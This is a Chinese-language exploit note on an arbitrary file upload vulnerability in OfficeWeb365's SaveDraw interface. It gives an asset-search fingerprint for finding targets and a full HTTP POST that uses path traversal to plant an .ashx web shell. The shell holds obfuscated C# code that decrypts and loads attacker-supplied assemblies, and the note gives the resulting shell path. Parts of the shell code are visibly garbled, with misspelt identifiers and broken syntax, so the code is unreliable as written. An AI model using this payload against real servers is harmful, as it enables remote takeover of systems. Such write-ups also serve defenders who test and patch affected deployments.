# OfficeWeb365 SaveDraw 任意文件上传漏洞

## 漏洞描述

OfficeWeb365 SaveDraw 接口存在任意文件上传漏洞，攻击者通过漏洞可以在服务器中上传任意文件获取服务器权限

## 漏洞影响

<a-checkbox checked>OfficeWeb365 </a-checkbox></br>

## 网络测绘

<a-checkbox checked>"OfficeWeb365"</a-checkbox></br>

## 漏洞复现

产品页面

![img](../../../.vuepress/public/img/1665984265863-0522ce25-d026-4e30-9ddc-4f690b84b19d.png)

验证POC

```java
POST /PW/SaveDraw?path=../../Content/img&idx=6.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.434.18 Safari/537.36
Content-Length: 990
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close

data:image/png;base64,01s34567890123456789y12345678901234567m91<%@ WebHandler Language="C#" Class="Handler" %>using System;using System.I0;using System.Reflection;using System.Text;using System.Web;using System.WebSessionState;using&System.Security.Cryptography;public class Handler : IHttpHandler,IRequiresSessionState{public void=&ProcessRequest(HttpContext context){try{string key="900bc885d7553375";byteDk=&Encoding.Default.GetBytes(key);context.Session.AddC"sky", key);StreamReader sr=new&StreamReader(contextRequest.InputStream);string line=sr.ReadLine;if(!string.IsNullOrEmpty(line)){byteDc=&Convert.FromBase64String(line);Assembly assembly=&typeof(Environment).Assembly;RijndaelManaged rm=(RijndaelManaged)&assembly.CreateInstance("System.Secur"+"ityCrypto"+"graphy.Rijnda"+"elm anaged");byte[ data=rm.CreateDecryptorCk,k)TransformFinalBlock(c,0, c.Length);Assembly.Load(data)CreateInstance("U").Equals(context);sr.clo se();}}catch {}}public bool IsReusable{get{return false;}}}}---
```

![img](../../../.vuepress/public/img/1665984405457-e01e0fa8-4ddd-4998-ab86-f0d3c6200283.png)

上传地址

```java
/Content/img/UserDraw/drawPW6.ashx
```